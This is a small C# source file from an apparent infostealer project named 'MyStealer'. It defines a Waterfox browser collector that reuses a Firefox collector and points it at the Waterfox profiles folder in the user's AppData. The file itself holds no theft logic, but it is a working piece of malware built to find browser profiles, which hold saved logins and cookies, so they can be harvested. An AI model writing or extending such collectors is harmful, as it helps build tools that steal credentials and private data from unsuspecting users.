using System;
using System.IO;

namespace MyStealer.Collectors.Browser.FirefoxBased
{
    internal class WaterFox : Firefox
    {
        public override string ApplicationName => "Waterfox";

        protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WaterFox", "Profiles");

        public override string[] LibDirectory => new string[] { "Waterfox" };
    }
}
